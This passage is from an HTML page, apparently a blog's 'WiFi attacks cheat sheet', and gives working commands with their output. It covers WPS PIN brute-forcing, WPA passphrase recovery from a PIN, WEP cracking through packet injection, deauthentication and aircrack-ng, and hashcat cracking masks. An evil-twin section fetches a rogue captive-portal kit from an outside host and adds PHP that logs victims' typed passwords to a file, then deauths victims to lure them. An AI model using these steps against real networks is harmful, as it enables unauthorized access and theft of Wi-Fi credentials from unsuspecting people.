+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+</code></pre></div></div>
+
+<p>In that case AP implements protection preventing from fast brute forcing. The tool can be tuned with additional advanced switches, for example:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    -L, --ignore-locks              Ignore locked state reported by the target AP
+    -N, --no-nacks                  Do not send NACK messages when out of order packets are received
+    -d, --delay=&lt;seconds&gt;           Set the delay between pin attempts [1]
+    -T, --m57-timeout=&lt;seconds&gt;     Set the M5/M7 timeout period [0.40]
+    -r, --recurring-delay=&lt;x:y&gt;     Sleep for y seconds every x pin attempts
+</code></pre></div></div>
+
+<h4 id="references--2">References <a name="wps-online-references"></a></h4>
+
+<p><a href="https://github.com/t6x/reaver-wps-fork-t6x">https://github.com/t6x/reaver-wps-fork-t6x</a></p>
+
+<h3 id="retrieving-passphrase-from-pin-">Retrieving passphrase from PIN <a name="wps-pin"></a></h3>
+
+<p>Usually when <code class="highlighter-rouge">reaver</code> finds PIN it also displays passphrase to the network. However, sometimes we may need to “manually” retrieve passphrase if a PIN is known to us.</p>
+
+<p>1. Create file <code class="highlighter-rouge">/etc/wpa_supplicant.conf</code> with followig content:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1
+</code></pre></div></div>
+
+<p>2. Start <code class="highlighter-rouge">wpa_supplicant</code> and leave it running.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf 
+Successfully initialized wpa_supplicant
+</code></pre></div></div>
+
+<p>3. Start <code class="highlighter-rouge">wpa_cli</code> and connect using known BSSID and PIN.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_cli 
+wpa_cli v2.9
+Copyright (c) 2004-2019, Jouni Malinen &lt;j@w1.fi&gt; and contributors
+
+This software may be distributed under the terms of the BSD license.
+See README for more details.
+
+
+Selected interface 'wlan0'
+
+Interactive mode
+
+&gt; status
+wpa_state=DISCONNECTED
+p2p_device_address=24:26:66:32:78:ec
+address=24:26:66:32:78:ec
+uuid=65eda292-d5cb-21a1-b654-a76e325e45
+&gt; wps_reg EA:DE:07:C0:96:BC 11586541
+OK
+&lt;3&gt;CTRL-EVENT-SCAN-STARTED 
+&lt;3&gt;CTRL-EVENT-SCAN-RESULTS 
+&lt;3&gt;WPS-AP-AVAILABLE 
+&lt;3&gt;SME: Trying to authenticate with ea:de:07:c0:96:bc (SSID='TP-LINK-HOME1' freq=2457 MHz)
+&lt;3&gt;Trying to associate with ea:de:07:c0:96:bc (SSID='TP-LINK-HOME1' freq=2457 MHz)
+&lt;3&gt;Associated with ea:de:07:c0:96:bc
+&lt;3&gt;CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
+&lt;3&gt;CTRL-EVENT-EAP-STARTED EAP authentication started
+&lt;3&gt;CTRL-EVENT-EAP-STATUS status='started' parameter=''
+&lt;3&gt;CTRL-EVENT-EAP-PROPOSED-METHOD vendor=14122 method=1
+&lt;3&gt;CTRL-EVENT-EAP-STATUS status='accept proposed method' parameter='WSC'
+&lt;3&gt;CTRL-EVENT-EAP-METHOD EAP vendor 14122 method 1 (WSC) selected
+&lt;3&gt;WPS-CRED-RECEIVED 
+&lt;3&gt;WPS-FAIL msg=11 config_error=0
+&lt;3&gt;CTRL-EVENT-EAP-STATUS status='completion' parameter='failure'
+&lt;3&gt;CTRL-EVENT-EAP-FAILURE EAP authentication failed
+&lt;3&gt;WPS-FAIL 
+&lt;3&gt;CTRL-EVENT-DISCONNECTED bssid=ea:de:07:c0:96:bc reason=3 locally_generated=1
+&lt;3&gt;CTRL-EVENT-REGDOM-CHANGE init=CORE type=WORLD
+&lt;3&gt;SME: Trying to authenticate with ea:de:07:c0:96:bc (SSID='TP-LINK-HOME1' freq=2457 MHz)
+&lt;3&gt;Trying to associate with ea:de:07:c0:96:bc (SSID='TP-LINK-HOME1' freq=2457 MHz)
+&lt;3&gt;Associated with ea:de:07:c0:96:bc
+&lt;3&gt;CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
+&lt;3&gt;WPA: Key negotiation completed with ea:de:07:c0:96:bc [PTK=CCMP GTK=CCMP]
+&lt;3&gt;CTRL-EVENT-CONNECTED - Connection to ea:de:07:c0:96:bc completed [id=0 id_str=]
+&gt; 
+</code></pre></div></div>
+<p>4. After successful connection, passphrase will be written to the <code class="highlighter-rouge">/etc/wpa_supplicant.conf</code> file.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat /etc/wpa_supplicant.conf 
+ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1
+
+network={
+  ssid="TP-LINK-HOME1"
+  psk="PASS!@#$"
+  proto=RSN
+  key_mgmt=WPA-PSK
+  pairwise=CCMP-256 GCMP-256 CCMP GCMP
+  group=CCMP-256 GCMP-256 CCMP GCMP TKIP
+  auth_alg=OPEN
+}
+</code></pre></div></div>
+
+<h4 id="references--3">References <a name="wps-pin-references"></a></h4>
+
+<p><a href="https://miloserdov.org/?p=138">https://miloserdov.org/?p=138</a></p>
+
+<h2 id="wep-">WEP <a name="wep"></a></h2>
+
+<p>It’s a predecessor of WPA/WPA2 protocol. Because of its design weaknesses it is possible to recover a key from captured packets. WEP encrypts data with RC4 enhanced with IV changed in every packet. IV is 24 bit long, so there’s a chance that two different packets will be encrypted with the same key, what may allow to perform statistical attack. WEP uses 40 bit or 104 bit keys (becuase IV takes 24 bits).</p>
+
+<p>Prerequisites:</p>
+<ul>
+  <li>AP configured with WEP</li>
+  <li>at least 1 connected client</li>
+</ul>
+
+<h3 id="attack-">Attack <a name="wep-attack"></a></h3>
+
+<p>1. Start capturing packets</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -w dump -c 10 --bssid BD:A2:7A:3E:F0:EB wlan0
+
+CH 10 ][ Elapsed: 2 mins ][ 2019-11-23 12:27 
+                                                                                                                                                 
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                 
+ BD:A2:7A:3E:F0:EB  -34  34     1462    16203   97  10  54e  WEP  WEP    OPN  TP-LINK-HOME2
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                       
+                                                                                                                                                                                                                   
+ BD:A2:7A:3E:F0:EB  70:C1:F4:F4:32:AE    0    1e- 1   36345    67756  TP-LINK-HOME2
+</code></pre></div></div>
+<p>2. We need to observe how many packets we already got.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                 
+ BD:A2:7A:3E:F0:EB  -34  34     1462    16203   97  10  54e  WEP  WEP    OPN  TP-LINK-HOME2
+</code></pre></div></div>
+<p>3. It is possible to speed up process of collecting packets by injecting new ones, which would cause generation of new packets and IVs.</p>
+
+<p>3.1. First way uses fake authentication, what associates us with AP. We need to wait until AP sends ARP packet which we will replay. It can be initiated in controlled environment by connecting local IP address.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -1 0 -e TP-LINK-HOME2 -a BD:A2:7A:3E:F0:EB -h 24:26:66:32:78:ec wlan0
+12:25:39  Waiting for beacon frame (BSSID: BD:A2:7A:3E:F0:EB) on channel 10
+
+12:25:40  Sending Authentication Request (Open System)
+12:25:40  Authentication successful
+12:25:40  Sending Association Request [ACK]
+12:25:40  Association successful :-) (AID: 1)
+
+# aireplay-ng -3 -b BD:A2:7A:3E:F0:EB -h 70:C1:F4:F4:32:AE wlan0
+The interface MAC (24:26:66:32:78:EC) doesn't match the specified MAC (-h).
+     ifconfig wlan0 hw ether 70:C1:F4:F4:32:AE
+12:25:44  Waiting for beacon frame (BSSID: BD:A2:7A:3E:F0:EB) on channel 10
+Saving ARP requests in replay_arp-1123-122544.cap
+You should also start airodump-ng to capture replies.
+Read 113792 packets (got 42545 ARP requests and 25019 ACKs), sent 28656 packets...(499 pps)
+</code></pre></div></div>
+
+<p>3.2. Second way (preferred) uses deauthentication of a connected client. After the client reconnects, we will catch and start replaying ARP packets.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -3 -b BD:A2:7A:3E:F0:EB -h 70:C1:F4:F4:32:AE wlan0
+The interface MAC (24:26:66:32:78:EC) doesn't match the specified MAC (-h).
+     ifconfig wlan0 hw ether 70:C1:F4:F4:32:AE
+14:35:21  Waiting for beacon frame (BSSID: 7C:8B:CA:76:3D:86) on channel 10
+Saving ARP requests in replay_arp-1123-143521.cap
+You should also start airodump-ng to capture replies.
+Notice: got a deauth/disassoc packet. Is the source MAC associated ?
+Notice: got a deauth/disassoc packet. Is the source MAC associated ?
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng -0 2 -a BD:A2:7A:3E:F0:EB -c 70:C1:F4:F4:32:AE wlan0
+14:35:57  Waiting for beacon frame (BSSID: BD:A2:7A:3E:F0:EB) on channel 10
+14:35:57  Sending 64 directed DeAuth. STMAC: [70:C1:F4:F4:32:AE] [ 0|47 ACKs]
+14:35:58  Sending 64 directed DeAuth. STMAC: [70:C1:F4:F4:32:AE] [29|87 ACKs]
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Read 165871 packets (got 1 ARP requests and 39619 ACKs), sent 42398 packets...(500 pps)
+</code></pre></div></div>
+
+<p>4. Start cracking when enough packets are collected (for example 20000 packets).</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aircrack-ng -a 1 -b BD:A2:7A:3E:F0:EB dump-18.cap
+Aircrack-ng 1.2 beta3
+
+
+                                                  [00:00:00] Tested 5986 keys (got 21666 IVs)
+
+   KB    depth   byte(vote)
+    0    1/  8   41(28160) 2A(27648) ED(27136) 16(26880) 5A(26880) 6C(26880) 83(26880) 16(26624) 33(26368) 3C(26112) 51(26112) 
+    1    0/  1   72(31488) 7C(29440) 01(27136) 27(26624) 20(26368) CA(26368) 13(26112) 82(26112) 84(26112) F0(26112) 37(25856) 
+    2    0/  1   55(32768) 60(27392) 12(27136) 1A(27136) C3(27136) EA(27136) 62(26368) 00(26112) 10(26112) 26(26112) 6C(25856) 
+    3    0/  2   41(30720) 3C(30464) 87(27904) 6F(27904) 6E(26368) A2(26368) D0(26368) 31(26112) 4C(26112) 56(26112) 76(26112) 
+    4    0/  1   4E(32768) 1D(27392) 36(27392) 26(26624) 18(26112) 51(26112) 8F(26112) E5(26112) 78(25856) 87(25856) CB(25856) 
+    5    1/ 11   3C(28160) 93(27648) A2(27648) CF(27648) 8B(27392) C3(27392) 92(27136) E6(27136) 07(26880) 61(26880) 72(26368) 
+    6    0/  2   D7(30208) 02(28672) 54(28160) EC(27136) 43(26624) 24(26368) D7(26368) DC(26368) 12(26112) 83(26112) 16(25856) 
+    7    0/  1   6A(29696) 1B(27392) 71(27392) 8E(27392) E3(27392) 61(27136) 94(26880) 0D(26368) B7(26368) 20(26112) 68(25856) 
+    8    0/  1   6E(32256) FF(28672) 50(27648) 11(27136) 43(26880) B2(26880) 0A(26624) DB(26624) 60(26368) 88(26368) 4A(26112) 
+    9    2/  5   38(27904) E5(27392) 02(27136) 99(26624) 57(26112) F7(25856) 9F(25600) E8(25600) 54(25344) 77(25344) 28(25088) 
+   10    0/  1   42(32768) A6(30208) 31(29440) AF(28928) DD(27136) F3(27136) 14(26880) 3D(26624) 3C(26368) 56(26368) 9C(26368) 
+   11    1/  3   11(29696) F5(29184) 5E(26624) BC(26368) 87(26368) 42(26112) F6(26112) 6F(25856) 97(25856) A2(25856) AA(25856) 
+   12    0/  2   35(28672) 47(27904) 0B(27136) 27(27136) 9F(26880) EC(26624) 5C(26368) 69(26368) FC(26368) A7(26112) BF(26112) 
+
+     KEY FOUND! [ 41:73:54:4B:4B:32:32:62:61:33:4D:31:33 ] (ASCII: AsTKK22ba3M13 )
+     Decrypted correctly: 100%
+</code></pre></div></div>
+
+<h3 id="references--4">References <a name="wep-attack-references"></a></h3>
+
+<ul>
+  <li><a href="https://www.aircrack-ng.org/doku.php?id=simple_wep_crack">https://www.aircrack-ng.org/doku.php?id=simple_wep_crack</a></li>
+  <li><a href="https://security.stackexchange.com/questions/41230/how-does-wifi-password-cracking-work">https://security.stackexchange.com/questions/41230/how-does-wifi-password-cracking-work</a></li>
+</ul>
+
+<h2 id="connecting-to-network-">Connecting to network <a name="connecting"></a></h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_supplicant -i wlan0 -c config
+</code></pre></div></div>
+
+<h3 id="preparning-config-file">Preparning config file</h3>
+
+<h4 id="open-network">Open network</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo -e 'network = {\n  ssid = "HOME 1" \n  key_mgmt = NONE \n}' &gt; config
+</code></pre></div></div>
+
+<h4 id="wpawpa2">WPA/WPA2</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpa_passphrase "HOME 2" 12345678 &gt; config
+</code></pre></div></div>
+
+<h2 id="fake-ap-">Fake AP <a name="fake-ap"></a></h2>
+
+<p>Own AP imitating original one, can be used to harvest passphrase (using social engineering) or to perform man-in-the-middle attacks.</p>
+
+<p>1. Configure static IP.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
+</code></pre></div></div>
+
+<p>2. Prepare fake captive portal.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wget https://www.shellvoide.com/media/files/rogueap.zip
+# unzip rogueap.zip -d /var/www/html
+</code></pre></div></div>
+
+<p>2.1 Simplify logging.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># touch /root/log.txt
+# chmod +rw /root/log.txt
+</code></pre></div></div>
+<p>Add to <code class="highlighter-rouge">/var/www/html/dbconnect.php</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file_put_contents("/root/log.txt", $_POST['password1'] . " | " . $_POST['password2'], FILE_APPEND);
+</code></pre></div></div>
+
+<p>Credentials will be saved to <code class="highlighter-rouge">/root/log.txt</code>.</p>
+
+<p>2.2. Configure redirects. Add to <code class="highlighter-rouge">/etc/apache2/sites-enable/000-default.conf</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  &lt;Directory /var/www/html&gt;
+  RewriteEngine on
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteRule .* http://192.168.1.1/index.html
+  &lt;/Directory&gt;
+</code></pre></div></div>
+
+<p>2.3. Restart apache.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># systemctl restart apache2
+</code></pre></div></div>
+
+<p>3. Prepare and run DNS and DHCP server.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface=wlan0
+address=/#/192.168.1.1
+dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,24h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+log-queries
+server=192.168.1.1
+log-dhcp
+listen-address=127.0.0.1
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># dnsmasq -C dnsmasq.conf  -d
+</code></pre></div></div>
+
+<p>4. Prepare and run AP.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface=wlan0
+driver=nl80211
+ssid=Free AP
+hw_mode=g
+channel=3
+macaddr_acl=0
+ignore_broadcast_ssid=0
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hostapd hostapd.conf 
+</code></pre></div></div>
+
+<p>5. We need to wait until victims connect to our AP. We can “help” them using deauth to disconnect them from their networks.</p>
+
+<p><a href="/images/wifi/captive.jpeg"><img src="/images/wifi/captive-small.jpeg" alt="" /></a></p>
+
+<h3 id="references--5">References <a name="fake-ap-references"></a></h3>
+<ul>
+  <li><a href="https://www.shellvoide.com/wifi/setting-up-fake-access-point-or-evil-twin-to-hack-wifi-rogue-ap/">https://www.shellvoide.com/wifi/setting-up-fake-access-point-or-evil-twin-to-hack-wifi-rogue-ap/</a></li>
+</ul>
+
+<h2 id="hashcat-">Hashcat <a name="hashcat"></a></h2>
+<p><code class="highlighter-rouge">hashcat --potfile-disable --force -m 2500 [HASH_FILE] [DICT_OR_MASK]</code></p>
+<ul>
+  <li><code class="highlighter-rouge">--force</code> - run without GPU</li>
+  <li><code class="highlighter-rouge">--potfile-disable</code> - don’t use local database. for testing</li>
+  <li><code class="highlighter-rouge">-a 3</code> - bruteforce</li>
+  <li><code class="highlighter-rouge">-a 1</code> - dictionary</li>
+  <li><code class="highlighter-rouge">-m 2500</code> - mode: 4hs</li>
+  <li><code class="highlighter-rouge">-m 16800</code> - mode: pmkid</li>
+</ul>
+
+<h3 id="masks">masks</h3>
+<p>built-in:</p>
+<ul>
+  <li><code class="highlighter-rouge">?l</code> = <code class="highlighter-rouge">abcdefghijklmnopqrstuvwxyz</code></li>
+  <li><code class="highlighter-rouge">?u</code> = <code class="highlighter-rouge">ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></li>
+  <li><code class="highlighter-rouge">?d</code> = <code class="highlighter-rouge">0123456789</code></li>
+  <li><code class="highlighter-rouge">?h</code> = <code class="highlighter-rouge">0123456789abcdef</code></li>
+  <li><code class="highlighter-rouge">?H</code> = <code class="highlighter-rouge">0123456789ABCDEF</code></li>
+  <li><code class="highlighter-rouge">?s</code> = <code class="highlighter-rouge">«space»!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_</code><code class="highlighter-rouge">{|}~</code></li>
+  <li><code class="highlighter-rouge">?a</code> = <code class="highlighter-rouge">?l?u?d?s</code></li>
+  <li><code class="highlighter-rouge">?b</code> = <code class="highlighter-rouge">0x00 - 0xff</code></li>
+</ul>
+
+<p>custom charset:</p>
+<ul>
+  <li><code class="highlighter-rouge">-1 [CHARS]</code></li>
+  <li><code class="highlighter-rouge">-2 [CHARS]</code></li>
+  <li><code class="highlighter-rouge">-3 [CHARS]</code></li>
+  <li><code class="highlighter-rouge">-4 [CHARS]</code></li>
+</ul>
+
+<p>example:</p>
+<ul>
+  <li><code class="highlighter-rouge">?d?d?d?d</code> - 4 digits</li>
+  <li><code class="highlighter-rouge">-1 ?l?u?d ?1?1?d?d</code> - 2x alphanum, 2x digits</li>
+  <li><code class="highlighter-rouge">-1 ?l?u?d ?1?1?1?1?1?1?1?1</code> - 8x alphanum</li>
+  <li><code class="highlighter-rouge">-1 ?l?d ?1?1?1?1?1?1?1?1</code> - 8x alphanum lower</li>
+</ul>
+
+ 	</div>
+</article>
+
+    </div>
+<footer><hr></footer>
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-89484033-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/wifi-cheatsheet/',
+		  'title': 'WiFi attacks cheat sheet'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+</html>
